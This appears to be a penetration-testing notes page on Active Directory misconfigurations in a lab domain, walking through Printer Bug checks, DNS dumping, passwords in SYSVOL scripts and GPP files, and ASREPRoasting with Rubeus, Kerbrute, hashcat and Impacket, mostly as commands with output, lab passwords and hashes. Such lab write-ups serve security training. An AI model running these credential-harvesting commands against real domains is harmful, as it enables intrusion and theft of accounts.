md-toggle" data-md-toggle="__nav_4_3_9_1_1" id="__nav_4_3_9_1_1" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_9_1_1"> <span class="md-ellipsis"> Passive Information Gathering </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Passive Information Gathering" class="md-nav" data-md-level="5"> <label class="md-nav__title" for="__nav_4_3_9_1_1"> <span class="md-nav__icon md-icon"></span> Passive Information Gathering </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../web/info_gathering/passive_info_gathering/whois/"> <span class="md-ellipsis"> WHOIS </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../web/info_gathering/passive_info_gathering/dns/"> <span class="md-ellipsis"> DNS </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../web/info_gathering/passive_info_gathering/passive_subdomain_enum/"> <span class="md-ellipsis"> Subdomain Enumeration </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../web/info_gathering/passive_info_gathering/passive_infrastructure_identification/"> <span class="md-ellipsis"> Infrastructure Identification </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_9_1_2" id="__nav_4_3_9_1_2" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_9_1_2"> <span class="md-ellipsis"> Active Information Gathering </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Active Information Gathering" class="md-nav" data-md-level="5"> <label class="md-nav__title" for="__nav_4_3_9_1_2"> <span class="md-nav__icon md-icon"></span> Active Information Gathering </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../web/info_gathering/active_info_gathering/active_infrastructure_identification/"> <span class="md-ellipsis"> Infrastructure Identification </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../web/info_gathering/active_info_gathering/active_subdomain_enumeration/"> <span class="md-ellipsis"> Subdomain Enumeration </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../web/info_gathering/active_info_gathering/virtual_hosts/"> <span class="md-ellipsis"> Virtual Hosts </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../web/info_gathering/active_info_gathering/crawling/"> <span class="md-ellipsis"> Crawling </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../tools/ffuf/"> <span class="md-ellipsis"> Ffuf </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../tools/hydra/"> <span class="md-ellipsis"> Hydra </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_9_4" id="__nav_4_3_9_4" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_9_4"> <span class="md-ellipsis"> SQLMap </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="SQLMap" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_9_4"> <span class="md-nav__icon md-icon"></span> SQLMap </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../tools/sqlmap/build_attacks/"> <span class="md-ellipsis"> Building Attacks </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../tools/sqlmap/db_enumeration/"> <span class="md-ellipsis"> DB Enumeration </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../tools/sqlmap/advanced_db_enumeration/"> <span class="md-ellipsis"> Advanced DB Enumeration </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../tools/sqlmap/bypassing_web_protections/"> <span class="md-ellipsis"> Bypassing Web App Protections </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../tools/sqlmap/os_exploitation/"> <span class="md-ellipsis"> OS Exploitation </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../web/xss/cross_site_scripting/"> <span class="md-ellipsis"> XSS </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../web/lfi/local_file_inclusion/"> <span class="md-ellipsis"> Local File Inclusion </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_10" id="__nav_4_3_10" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_10"> <span class="md-ellipsis"> Documenting </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Documenting" class="md-nav" data-md-level="3"> <label class="md-nav__title" for="__nav_4_3_10"> <span class="md-nav__icon md-icon"></span> Documenting </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../documentation_and_reporting/preparation/"> <span class="md-ellipsis"> Preparation </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_4" id="__nav_4_4" type="checkbox"/> <label class="md-nav__link" for="__nav_4_4"> <span class="md-ellipsis"> Blue Team </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Blue Team" class="md-nav" data-md-level="2"> <label class="md-nav__title" for="__nav_4_4"> <span class="md-nav__icon md-icon"></span> Blue Team </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../file_analysis/useful_links/"> <span class="md-ellipsis"> File Analysis </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class="md-content" data-md-component="content"> <article class="md-content__inner md-typeset"> <h1>Misconfigurations</h1> <h2>Printer Bug</h2> <p>We can use tools such as the <code>Get-SpoolStatus</code> module from <a href="https://github.com/cube0x0/Security-Assessment" rel="noopener nofollow" target="_blank">this</a> tool to check for machines vulnerable to the <a href="https://blog.stealthbits.com/unconstrained-delegation-exploit" rel="noopener nofollow" target="_blank">MS-PRN Printer Bug</a>. This flaw can be used to compromise a host in another forest that has Unconstrained Delegation enabled, such as a domain controller. It can help us to attack across forest trusts once we have compromised one forest.</p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-0-1" id="__codelineno-0-1" name="__codelineno-0-1"></a>PS C:\xyz&gt; Import-Module .\SecurityAssessment.ps1
<a href="#__codelineno-0-2" id="__codelineno-0-2" name="__codelineno-0-2"></a>PS C:\xyz&gt; Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.legalcorp.local
<a href="#__codelineno-0-3" id="__codelineno-0-3" name="__codelineno-0-3"></a>
<a href="#__codelineno-0-4" id="__codelineno-0-4" name="__codelineno-0-4"></a>ComputerName                        Status
<a href="#__codelineno-0-5" id="__codelineno-0-5" name="__codelineno-0-5"></a>------------                        ------
<a href="#__codelineno-0-6" id="__codelineno-0-6" name="__codelineno-0-6"></a>ACADEMY-EA-DC01.legalcorp.local   True
</code></pre></div> <hr/> <h2>Enumerating DNS Records</h2> <p>We can use a tool such as <a href="https://github.com/dirkjanm/adidnsdump" rel="noopener nofollow" target="_blank">adidnsdump</a> to enumerate all DNS records in a domain using a valid domain user account.</p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-1-1" id="__codelineno-1-1" name="__codelineno-1-1"></a>secops@kali[/kali]$ adidnsdump -u LEGALCORP\\forend ldap://172.16.5.5 
<a href="#__codelineno-1-2" id="__codelineno-1-2" name="__codelineno-1-2"></a>
<a href="#__codelineno-1-3" id="__codelineno-1-3" name="__codelineno-1-3"></a>Password: 
<a href="#__codelineno-1-4" id="__codelineno-1-4" name="__codelineno-1-4"></a>
<a href="#__codelineno-1-5" id="__codelineno-1-5" name="__codelineno-1-5"></a>[-] Connecting to host...
<a href="#__codelineno-1-6" id="__codelineno-1-6" name="__codelineno-1-6"></a>[-] Binding to host
<a href="#__codelineno-1-7" id="__codelineno-1-7" name="__codelineno-1-7"></a>[+] Bind OK
<a href="#__codelineno-1-8" id="__codelineno-1-8" name="__codelineno-1-8"></a>[-] Querying zone for records
<a href="#__codelineno-1-9" id="__codelineno-1-9" name="__codelineno-1-9"></a>[+] Found 27 records
</code></pre></div> <p>It is worth running this tool in larger environments. We may uncover "hidden" records that can lead to discovering interesting hosts.</p> <hr/> <h2>Password in Description Field</h2> <div class="highlight"><pre><span></span><code><a href="#__codelineno-2-1" id="__codelineno-2-1" name="__codelineno-2-1"></a>PS C:\xyz&gt; Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
<a href="#__codelineno-2-2" id="__codelineno-2-2" name="__codelineno-2-2"></a>
<a href="#__codelineno-2-3" id="__codelineno-2-3" name="__codelineno-2-3"></a>samaccountname description
<a href="#__codelineno-2-4" id="__codelineno-2-4" name="__codelineno-2-4"></a>-------------- -----------
<a href="#__codelineno-2-5" id="__codelineno-2-5" name="__codelineno-2-5"></a>administrator  Built-in account for administering the computer/domain
<a href="#__codelineno-2-6" id="__codelineno-2-6" name="__codelineno-2-6"></a>guest          Built-in account for guest access to the computer/domain
<a href="#__codelineno-2-7" id="__codelineno-2-7" name="__codelineno-2-7"></a>krbtgt         Key Distribution Center Service Account
<a href="#__codelineno-2-8" id="__codelineno-2-8" name="__codelineno-2-8"></a>ldap.agent     *** DO NOT CHANGE ***  3/12/2012: Sunsh1ne4All!
</code></pre></div> <hr/> <h2>PASSWD_NOTREQD Field</h2> <p>It is possible to come across domain accounts with the <a href="https://ldapwiki.com/wiki/PASSWD_NOTREQD" rel="noopener nofollow" target="_blank">passwd_notreqd</a> field set in the userAccountControl attribute.</p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-3-1" id="__codelineno-3-1" name="__codelineno-3-1"></a>PS C:\xyz&gt; Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
<a href="#__codelineno-3-2" id="__codelineno-3-2" name="__codelineno-3-2"></a>
<a href="#__codelineno-3-3" id="__codelineno-3-3" name="__codelineno-3-3"></a>samaccountname                                                         useraccountcontrol
<a href="#__codelineno-3-4" id="__codelineno-3-4" name="__codelineno-3-4"></a>--------------                                                         ------------------
<a href="#__codelineno-3-5" id="__codelineno-3-5" name="__codelineno-3-5"></a>guest                ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
<a href="#__codelineno-3-6" id="__codelineno-3-6" name="__codelineno-3-6"></a>mlowe                                PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
<a href="#__codelineno-3-7" id="__codelineno-3-7" name="__codelineno-3-7"></a>ehamilton                            PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
<a href="#__codelineno-3-8" id="__codelineno-3-8" name="__codelineno-3-8"></a>$725000-9jb50uejje9f                       ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT
<a href="#__codelineno-3-9" id="__codelineno-3-9" name="__codelineno-3-9"></a>nagiosagent                                                PASSWD_NOTREQD, NORMAL_ACCOUNT
</code></pre></div> <hr/> <h2>Credentials in SMB Shares and SYSVOL Scripts</h2> <p>The SYSVOL share is readable by all authenticated users in the domain. Here, we can see an interesting script named <code>reset_local_admin_pass.vbs</code>.</p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-4-1" id="__codelineno-4-1" name="__codelineno-4-1"></a>PS C:\xyz&gt; ls \\academy-ea-dc01\SYSVOL\legalcorp.local\scripts
<a href="#__codelineno-4-2" id="__codelineno-4-2" name="__codelineno-4-2"></a>
<a href="#__codelineno-4-3" id="__codelineno-4-3" name="__codelineno-4-3"></a>    Directory: \\academy-ea-dc01\SYSVOL\legalcorp.local\scripts
<a href="#__codelineno-4-4" id="__codelineno-4-4" name="__codelineno-4-4"></a>
<a href="#__codelineno-4-5" id="__codelineno-4-5" name="__codelineno-4-5"></a>
<a href="#__codelineno-4-6" id="__codelineno-4-6" name="__codelineno-4-6"></a>Mode                LastWriteTime         Length Name                                                                 
<a href="#__codelineno-4-7" id="__codelineno-4-7" name="__codelineno-4-7"></a>----                -------------         ------ ----                                                                 
<a href="#__codelineno-4-8" id="__codelineno-4-8" name="__codelineno-4-8"></a>-a----       11/18/2021  10:44 AM            174 daily-runs.zip                                                       
<a href="#__codelineno-4-9" id="__codelineno-4-9" name="__codelineno-4-9"></a>-a----        2/28/2022   9:11 PM            203 disable-nbtns.ps1                                                    
<a href="#__codelineno-4-10" id="__codelineno-4-10" name="__codelineno-4-10"></a>-a----         3/7/2022   9:41 AM         144138 Logon Banner.htm                                                     
<a href="#__codelineno-4-11" id="__codelineno-4-11" name="__codelineno-4-11"></a>-a----         3/8/2022   2:56 PM            979 reset_local_admin_pass.vbs  
</code></pre></div> <p>Taking a closer look at the script, we see that it contains a password for the built-in local administrator on Windows hosts. It would be worth checking to see if this password is still set on any hosts in the domain.</p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-5-1" id="__codelineno-5-1" name="__codelineno-5-1"></a>PS C:\xyz&gt; cat \\academy-ea-dc01\SYSVOL\legalcorp.local\scripts\reset_local_admin_pass.vbs
<a href="#__codelineno-5-2" id="__codelineno-5-2" name="__codelineno-5-2"></a>
<a href="#__codelineno-5-3" id="__codelineno-5-3" name="__codelineno-5-3"></a>On Error Resume Next
<a href="#__codelineno-5-4" id="__codelineno-5-4" name="__codelineno-5-4"></a>strComputer = "."
<a href="#__codelineno-5-5" id="__codelineno-5-5" name="__codelineno-5-5"></a>
<a href="#__codelineno-5-6" id="__codelineno-5-6" name="__codelineno-5-6"></a>Set oShell = CreateObject("WScript.Shell") 
<a href="#__codelineno-5-7" id="__codelineno-5-7" name="__codelineno-5-7"></a>sUser = "Administrator"
<a href="#__codelineno-5-8" id="__codelineno-5-8" name="__codelineno-5-8"></a>sPwd = "!lcorp_L0cALADmin!"
<a href="#__codelineno-5-9" id="__codelineno-5-9" name="__codelineno-5-9"></a>
<a href="#__codelineno-5-10" id="__codelineno-5-10" name="__codelineno-5-10"></a>Set Arg = WScript.Arguments
<a href="#__codelineno-5-11" id="__codelineno-5-11" name="__codelineno-5-11"></a>If  Arg.Count &gt; 0 Then
<a href="#__codelineno-5-12" id="__codelineno-5-12" name="__codelineno-5-12"></a>sPwd = Arg(0) 'Pass the password as parameter to the script
<a href="#__codelineno-5-13" id="__codelineno-5-13" name="__codelineno-5-13"></a>End if
<a href="#__codelineno-5-14" id="__codelineno-5-14" name="__codelineno-5-14"></a>
<a href="#__codelineno-5-15" id="__codelineno-5-15" name="__codelineno-5-15"></a>'Get the administrator name
<a href="#__codelineno-5-16" id="__codelineno-5-16" name="__codelineno-5-16"></a>Set objWMIService = GetObject("winmgmts:\\" &amp; strComputer &amp; "\root\cimv2")
<a href="#__codelineno-5-17" id="__codelineno-5-17" name="__codelineno-5-17"></a>
<a href="#__codelineno-5-18" id="__codelineno-5-18" name="__codelineno-5-18"></a>&lt;SNIP&gt;
</code></pre></div> <hr/> <h3>Locating &amp; Retrieving GPP Passwords with CrackMapExec</h3> <div class="highlight"><pre><span></span><code><a href="#__codelineno-6-1" id="__codelineno-6-1" name="__codelineno-6-1"></a>secops@kali[/kali]$ crackmapexec smb -L | grep gpp
<a href="#__codelineno-6-2" id="__codelineno-6-2" name="__codelineno-6-2"></a>
<a href="#__codelineno-6-3" id="__codelineno-6-3" name="__codelineno-6-3"></a>[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
<a href="#__codelineno-6-4" id="__codelineno-6-4" name="__codelineno-6-4"></a>[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
</code></pre></div> <p>It is also possible to find passwords in files such as Registry.xml when autologon is configured via Group Policy.</p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-7-1" id="__codelineno-7-1" name="__codelineno-7-1"></a>secops@kali[/kali]$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
<a href="#__codelineno-7-2" id="__codelineno-7-2" name="__codelineno-7-2"></a>
<a href="#__codelineno-7-3" id="__codelineno-7-3" name="__codelineno-7-3"></a>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:legalcorp.local) (signing:True) (SMBv1:False)
<a href="#__codelineno-7-4" id="__codelineno-7-4" name="__codelineno-7-4"></a>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] legalcorp.local\forend:Klmcargo2 
<a href="#__codelineno-7-5" id="__codelineno-7-5" name="__codelineno-7-5"></a>GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found SYSVOL share
<a href="#__codelineno-7-6" id="__codelineno-7-6" name="__codelineno-7-6"></a>GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Searching for Registry.xml
<a href="#__codelineno-7-7" id="__codelineno-7-7" name="__codelineno-7-7"></a>GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Found legalcorp.local/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml
<a href="#__codelineno-7-8" id="__codelineno-7-8" name="__codelineno-7-8"></a>GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found credentials in legalcorp.local/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml
<a href="#__codelineno-7-9" id="__codelineno-7-9" name="__codelineno-7-9"></a>GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Usernames: ['guarddesk']
<a href="#__codelineno-7-10" id="__codelineno-7-10" name="__codelineno-7-10"></a>GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Domains: ['legalcorp.local']
<a href="#__codelineno-7-11" id="__codelineno-7-11" name="__codelineno-7-11"></a>GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: ['lcorpguardadmin!']
</code></pre></div> <p>We can see that we have retrieved the credentials for an account called <code>guarddesk</code>. This may have been set up so that shared workstations used by guards automatically log in at boot to accommodate multiple users throughout the day and night working different shifts. In this case, the credentials are likely a local admin, so it would be worth finding hosts where we can log in as an admin and hunt for additional data. Whenever we obtain credentials, we should check to see if we can use them to access other hosts, leverage any rights such as interesting ACLs, access shares, or use the password in a password spraying attack to uncover password re-use and maybe an account that grants us further access towards our goal.</p> <hr/> <h2>ASREPRoasting</h2> <p>It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the <a href="https://www.tenable.com/blog/how-to-stop-the-kerberos-pre-authentication-attack-in-active-directory" rel="noopener nofollow" target="_blank">Do not require Kerberos pre-authentication</a> setting enabled.</p> <p>Like Kerberoasting, the success of this attack depends on the account having a relatively weak password.</p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-8-1" id="__codelineno-8-1" name="__codelineno-8-1"></a>PS C:\xyz&gt; Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
<a href="#__codelineno-8-2" id="__codelineno-8-2" name="__codelineno-8-2"></a>
<a href="#__codelineno-8-3" id="__codelineno-8-3" name="__codelineno-8-3"></a>samaccountname     : mmorgan
<a href="#__codelineno-8-4" id="__codelineno-8-4" name="__codelineno-8-4"></a>userprincipalname  : mmorgan@legalcorp.local
<a href="#__codelineno-8-5" id="__codelineno-8-5" name="__codelineno-8-5"></a>useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
</code></pre></div> <p>This attack does not require any domain user context and can be done by just knowing the SAM name for the user without Kerberos pre-auth.</p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-9-1" id="__codelineno-9-1" name="__codelineno-9-1"></a>PS C:\xyz&gt; .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
<a href="#__codelineno-9-2" id="__codelineno-9-2" name="__codelineno-9-2"></a>
<a href="#__codelineno-9-3" id="__codelineno-9-3" name="__codelineno-9-3"></a>   ______        _
<a href="#__codelineno-9-4" id="__codelineno-9-4" name="__codelineno-9-4"></a>  (_____ \      | |
<a href="#__codelineno-9-5" id="__codelineno-9-5" name="__codelineno-9-5"></a>   _____) )_   _| |__  _____ _   _  ___
<a href="#__codelineno-9-6" id="__codelineno-9-6" name="__codelineno-9-6"></a>  |  __  /| | | |  _ \| ___ | | | |/___)
<a href="#__codelineno-9-7" id="__codelineno-9-7" name="__codelineno-9-7"></a>  | |  \ \| |_| | |_) ) ____| |_| |___ |
<a href="#__codelineno-9-8" id="__codelineno-9-8" name="__codelineno-9-8"></a>  |_|   |_|____/|____/|_____)____/(___/
<a href="#__codelineno-9-9" id="__codelineno-9-9" name="__codelineno-9-9"></a>
<a href="#__codelineno-9-10" id="__codelineno-9-10" name="__codelineno-9-10"></a>  v2.0.2
<a href="#__codelineno-9-11" id="__codelineno-9-11" name="__codelineno-9-11"></a>
<a href="#__codelineno-9-12" id="__codelineno-9-12" name="__codelineno-9-12"></a>[*] Action: AS-REP roasting
<a href="#__codelineno-9-13" id="__codelineno-9-13" name="__codelineno-9-13"></a>
<a href="#__codelineno-9-14" id="__codelineno-9-14" name="__codelineno-9-14"></a>[*] Target User            : mmorgan
<a href="#__codelineno-9-15" id="__codelineno-9-15" name="__codelineno-9-15"></a>[*] Target Domain          : legalcorp.local
<a href="#__codelineno-9-16" id="__codelineno-9-16" name="__codelineno-9-16"></a>
<a href="#__codelineno-9-17" id="__codelineno-9-17" name="__codelineno-9-17"></a>[*] Searching path 'LDAP://ACADEMY-EA-DC01.legalcorp.local/DC=LEGALCORP,DC=LOCAL' for '(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=mmorgan))'
<a href="#__codelineno-9-18" id="__codelineno-9-18" name="__codelineno-9-18"></a>[*] SamAccountName         : mmorgan
<a href="#__codelineno-9-19" id="__codelineno-9-19" name="__codelineno-9-19"></a>[*] DistinguishedName      : CN=Matthew Morgan,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=LEGALCORP,DC=LOCAL
<a href="#__codelineno-9-20" id="__codelineno-9-20" name="__codelineno-9-20"></a>[*] Using domain controller: ACADEMY-EA-DC01.legalcorp.local (172.16.5.5)
<a href="#__codelineno-9-21" id="__codelineno-9-21" name="__codelineno-9-21"></a>[*] Building AS-REQ (w/o preauth) for: 'legalcorp.local\mmorgan'
<a href="#__codelineno-9-22" id="__codelineno-9-22" name="__codelineno-9-22"></a>[+] AS-REQ w/o preauth successful!
<a href="#__codelineno-9-23" id="__codelineno-9-23" name="__codelineno-9-23"></a>[*] AS-REP hash:
<a href="#__codelineno-9-24" id="__codelineno-9-24" name="__codelineno-9-24"></a>     $krb5asrep$23$mmorgan@legalcorp.local:D18650F4F4E0537E0188A6897A478C55$0978822DEC13046712DB7DC03F6C4DE059A946485451AAE98BB93DFF8E3E64F3AA5614160F21A029C2B9437CB16E5E9DA4A2870FEC0596B09BADA989D1F8057262EA40840E8D0F20313B4E9A40FA5E4F987FF404313227A7BFFAE748E07201369D48ABB4727DFE1A9F09D50D7EE3AA5C13E4433E0F9217533EE0E74B02EB8907E13A208340728F794ED5103CB3E5C7915BF2F449AFDA41988FF48A356BF2BE680A25931A8746A99AD3E757BFE097B852F72CEAE1B74720C011CFF7EC94CBB6456982F14DA17213B3B27DFA1AD4C7B5C7120DB0D70763549E5144F1F5EE2AC71DDFC4DCA9D25D39737DC83B6BC60E0A0054FC0FD2B2B48B25C6CA
</code></pre></div> <div class="highlight"><pre><span></span><code><a href="#__codelineno-10-1" id="__codelineno-10-1" name="__codelineno-10-1"></a>secops@kali[/kali]$ hashcat -m 18200 lcorp_asrep /usr/share/wordlists/rockyou.txt 
<a href="#__codelineno-10-2" id="__codelineno-10-2" name="__codelineno-10-2"></a>
<a href="#__codelineno-10-3" id="__codelineno-10-3" name="__codelineno-10-3"></a>hashcat (v6.1.1) starting...
<a href="#__codelineno-10-4" id="__codelineno-10-4" name="__codelineno-10-4"></a>
<a href="#__codelineno-10-5" id="__codelineno-10-5" name="__codelineno-10-5"></a>&lt;SNIP&gt;
</code></pre></div> <p>When performing user enumeration with <code>Kerbrute</code>, the tool will automatically retrieve the AS-REP for any users found that do not require Kerberos pre-authentication.</p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-11-1" id="__codelineno-11-1" name="__codelineno-11-1"></a>secops@kali[/kali]$ kerbrute userenum -d legalcorp.local --dc 172.16.5.5 /opt/jsmith.txt 
<a href="#__codelineno-11-2" id="__codelineno-11-2" name="__codelineno-11-2"></a>
<a href="#__codelineno-11-3" id="__codelineno-11-3" name="__codelineno-11-3"></a>    __             __               __     
<a href="#__codelineno-11-4" id="__codelineno-11-4" name="__codelineno-11-4"></a>   / /_____  _____/ /_  _______  __/ /____ 
<a href="#__codelineno-11-5" id="__codelineno-11-5" name="__codelineno-11-5"></a>  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
<a href="#__codelineno-11-6" id="__codelineno-11-6" name="__codelineno-11-6"></a> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
<a href="#__codelineno-11-7" id="__codelineno-11-7" name="__codelineno-11-7"></a>/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
<a href="#__codelineno-11-8" id="__codelineno-11-8" name="__codelineno-11-8"></a>
<a href="#__codelineno-11-9" id="__codelineno-11-9" name="__codelineno-11-9"></a>Version: dev (9cfb81e) - 04/01/22 - Ronnie Flathers @ropnop
<a href="#__codelineno-11-10" id="__codelineno-11-10" name="__codelineno-11-10"></a>
<a href="#__codelineno-11-11" id="__codelineno-11-11" name="__codelineno-11-11"></a>2022/04/01 13:14:17 &gt;  Using KDC(s):
<a href="#__codelineno-11-12" id="__codelineno-11-12" name="__codelineno-11-12"></a>2022/04/01 13:14:17 &gt;   172.16.5.5:88
<a href="#__codelineno-11-13" id="__codelineno-11-13" name="__codelineno-11-13"></a>
<a href="#__codelineno-11-14" id="__codelineno-11-14" name="__codelineno-11-14"></a>2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:   sbrown@legalcorp.local
<a href="#__codelineno-11-15" id="__codelineno-11-15" name="__codelineno-11-15"></a>2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:   jjones@legalcorp.local
<a href="#__codelineno-11-16" id="__codelineno-11-16" name="__codelineno-11-16"></a>2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:   tjohnson@legalcorp.local
<a href="#__codelineno-11-17" id="__codelineno-11-17" name="__codelineno-11-17"></a>2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:   jwilson@legalcorp.local
<a href="#__codelineno-11-18" id="__codelineno-11-18" name="__codelineno-11-18"></a>2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:   bdavis@legalcorp.local
<a href="#__codelineno-11-19" id="__codelineno-11-19" name="__codelineno-11-19"></a>2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:   njohnson@legalcorp.local
<a href="#__codelineno-11-20" id="__codelineno-11-20" name="__codelineno-11-20"></a>2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:   asanchez@legalcorp.local
<a href="#__codelineno-11-21" id="__codelineno-11-21" name="__codelineno-11-21"></a>2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:   dlewis@legalcorp.local
<a href="#__codelineno-11-22" id="__codelineno-11-22" name="__codelineno-11-22"></a>2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:   ccruz@legalcorp.local
<a href="#__codelineno-11-23" id="__codelineno-11-23" name="__codelineno-11-23"></a>2022/04/01 13:14:17 &gt;  [+] mmorgan has no pre auth required. Dumping hash to crack offline:
<a href="#__codelineno-11-24" id="__codelineno-11-24" name="__codelineno-11-24"></a>$krb5asrep$23$mmorgan@legalcorp.local:400d306dda575be3d429aad39ec68a33$8698ee566cde591a7ddd1782db6f7ed8531e266befed4856b9fcbbdda83a0c9c5ae4217b9a43d322ef35a6a22ab4cbc86e55a1fa122a9f5cb22596084d6198454f1df2662cb00f513d8dc3b8e462b51e8431435b92c87d200da7065157a6b24ec5bc0090e7cf778ae036c6781cc7b94492e031a9c076067afc434aa98e831e6b3bff26f52498279a833b04170b7a4e7583a71299965c48a918e5d72b5c4e9b2ccb9cf7d793ef322047127f01fd32bf6e3bb5053ce9a4bf82c53716b1cee8f2855ed69c3b92098b255cc1c5cad5cd1a09303d83e60e3a03abee0a1bb5152192f3134de1c0b73246b00f8ef06c792626fd2be6ca7af52ac4453e6a
<a href="#__codelineno-11-25" id="__codelineno-11-25" name="__codelineno-11-25"></a>
<a href="#__codelineno-11-26" id="__codelineno-11-26" name="__codelineno-11-26"></a>&lt;SNIP&gt;
</code></pre></div> <p>With a list of valid users, we can use <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py" rel="noopener nofollow" target="_blank">Get-NPUsers.py</a> to search for all users with Kerberoast pre-authentication not required.</p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-12-1" id="__codelineno-12-1" name="__codelineno-12-1"></a>secops@kali[/kali]$ GetNPUsers.py legalcorp.local/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
<a href="#__codelineno-12-2" id="__codelineno-12-2" name="__codelineno-12-2"></a>Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
<a href="#__codelineno-12-3" id="__codelineno-12-3" name="__codelineno-12-3"></a>
<a href="#__codelineno-12-4" id="__codelineno-12-4" name="__codelineno-12-4"></a>[-] User sbrown@legalcorp.local doesn't have UF_DONT_REQUIRE_PREAUTH set
